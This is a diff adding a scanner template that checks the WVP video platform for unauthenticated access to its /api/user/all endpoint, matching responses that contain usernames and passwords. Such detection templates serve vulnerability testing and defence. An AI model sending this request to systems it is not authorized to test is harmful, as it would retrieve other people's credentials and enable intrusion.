@@ -1,0 +1,29 @@
+id: poc-yaml-wvp-gb28181-user-list-info-leak
+info:
+  name: WVP Video Platform Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+  description: |
+    The /api/user/all endpoint in the WVP Video Platform is vulnerable to unauthorized access, allowing attackers to retrieve sensitive user information, including usernames and passwords.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/all"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "id"
+          - "\"username\""
+          - "\"password\""
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
